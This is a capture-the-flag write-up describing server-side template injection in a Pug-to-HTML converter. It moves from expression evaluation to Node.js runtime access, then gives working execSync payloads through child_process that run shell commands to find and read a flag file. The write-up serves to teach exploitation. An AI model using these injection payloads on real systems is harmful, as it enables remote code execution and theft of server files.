# Templates

## Challenge Overview

The challenge provides a **Pug-to-HTML converter**.

**Pug** is a shorthand HTML templating language. A Pug compiler transforms it into standard HTML:

```pug
doctype html
head
  title Pug
  script.
    console.log("Pugs are cute")
h1 Pug - node template engine
#container.col
  p You are amazing
  p Pug is a terse and simple templating language.
```

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Pug</title>
    <script>
      console.log("Pugs are cute")
    </script>
  </head>
  <body>
    <h1>Pug - node template engine</h1>
    <div id="container" class="col">
      <p>You are amazing</p>
      <p>Pug is a terse and simple templating language.</p>
    </div>
  </body>
</html>
```

---

## Exploitation

### Step 1 — Basic Rendering Test

Confirmed the converter renders Pug normally:

```pug
h1 hello
p test
```

```html
<h1>hello</h1>
<p>test</p>
```

### Step 2 — JavaScript Expression Evaluation

Pug supports `#{...}` for inline expressions. Tested whether it evaluates JavaScript:

```pug
p #{7*7}
```

```html
<p>49</p>
```

✅ JavaScript executes.

### Step 3 — Node.js Runtime Access

Tested whether Node.js globals are accessible:

```pug
p #{process.version}
p #{process.platform}
p #{process.cwd()}
```

All three returned real values, confirming **the template engine has access to the Node.js runtime**.

### Step 4 — Remote Code Execution

With Node.js globals available, injected a `child_process` call to search for flag files:

```pug
pre= global.process.mainModule.require('child_process').execSync('find / -name "*flag*" 2>/dev/null | head -50').toString()
```

Output included:
/usr/src/app/flag.txt

### Step 5 — Flag Retrieval

```pug
pre= global.process.mainModule.require('child_process').execSync('cat /usr/src/app/flag.txt').toString()
```

🏁 Flag retrieved.
